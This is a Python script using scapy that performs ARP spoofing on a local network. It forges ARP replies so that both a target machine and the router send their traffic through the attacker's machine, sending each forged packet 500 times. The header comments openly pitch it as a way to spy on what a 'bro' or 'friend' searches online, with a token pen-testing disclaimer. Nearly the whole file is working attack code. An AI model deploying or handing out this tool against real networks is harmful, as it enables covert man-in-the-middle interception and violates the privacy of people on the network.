# Author: Yuval Rosenthal
# A "friend searcher"
# DO You WaNt To KnOW What yOUR bro SEaRchS OnlINE??????!??!!
# Just WriTe DowN HIs Ip AND Open wIREsHArk LOL :D
# THIS PROGRAM IS FOR RESEARCH PURPOSES(I.E pen-testing)

from scapy.layers.l2 import *
import netifaces

#######################################################################
#                                 /\                                  #
#   BIG GOVERNMENT IS            /  \                                 #
#    ALWAYS WATCHING!           /    \                                #
#                              /      \                               #
#                             /  <()>  \                              #
#                            /          \                             #
#                           /            \                            #
#                          /______________\                           #
#######################################################################

BROADCAST_IP = 'ff:ff:ff:ff:ff:ff'  # The broadcast mac address
DEFAULT_GATEWAY = netifaces.gateways()['default'][netifaces.AF_INET][0]
ROUTER_MAC = getmacbyip(DEFAULT_GATEWAY)
GODS_ADDRESS = get_if_hwaddr(conf.iface)
IS_AT_STATEMENT = 2


class DeadlyArrows:

    def start_bug(self, pack):
        """
        Wait for the first question and reply alot :D
        """

        try:

            self.divert_to_bug(pack)

        except KeyboardInterrupt:
            print("You will be missed! :(")
            return

    def divert_to_bug(self, pack):
        """
         Create 2 packets one will be sent from server to client the other from server to router
         Each packet states the latter destination belongs to the servers MAC address
         In short start the "bugging" of your "friend"
        :param pack: the clients request packet
        """

        response_to_your_friend = self.redirect_to_client(pack)
        response_to_his_friend = self.redirect_to_router(pack)

        print("You friend will be noticed:\n", response_to_your_friend.summary(),
              "\nHis Friend will know:\n", response_to_his_friend.summary())

        response_to_your_friend.show()
        response_to_his_friend.show()

        self.confuse(response_to_your_friend, response_to_his_friend)

    def redirect_to_client(self, pack):
        """
         Create a response variable which will hold the packet sent to the client
        :param pack: The clients request packet
        :return: The response -> client packet
        """

        response = pack.copy()
        response = self.create_impostor(response)

        return response

    def create_impostor(self, response):
        """
        Create the response to client packet
        :param response: The response packet
        :return: The response packet
        """

        client_ip = response[ARP].psrc
        client_mac = response[Ether].src

        response[ARP].psrc = DEFAULT_GATEWAY
        response[ARP].hwsrc = GODS_ADDRESS
        response[Ether].src = GODS_ADDRESS
        response[Ether].dst = client_mac

        response[ARP].pdst = client_ip
        response[ARP].hwdst = client_mac
        response[ARP].op = IS_AT_STATEMENT

        return response

    def redirect_to_router(self, pack):
        """
         Create a response variable which will hold the packet sent to the router
        :param pack: The clients request packet
        :return: The response -> router packet
        """

        response = pack.copy()
        response = self.create_him(response)

        return response

    def create_him(self, response):
        """
         Create the response to router packet
        :param response: The response packet
        :return: The response packet
        """

        router_ip = DEFAULT_GATEWAY

        response[ARP].psrc = response[ARP].psrc
        response[ARP].hwsrc = GODS_ADDRESS
        response[Ether].src = GODS_ADDRESS
        response[Ether].dst = ROUTER_MAC

        response[ARP].pdst = router_ip
        response[ARP].hwdst = ROUTER_MAC
        response[ARP].op = IS_AT_STATEMENT

        return response

    def confuse(self, response_to_your_friend, response_to_his_friend):
        """
         Inform router you are the client and the client that you are the server(GOD)
        :param response_to_your_friend: Packet -> Client
        :param response_to_his_friend: Packet -> Router/ISP provider
        """

        sendp(response_to_your_friend, count=500)
        sendp(response_to_his_friend, count=500)
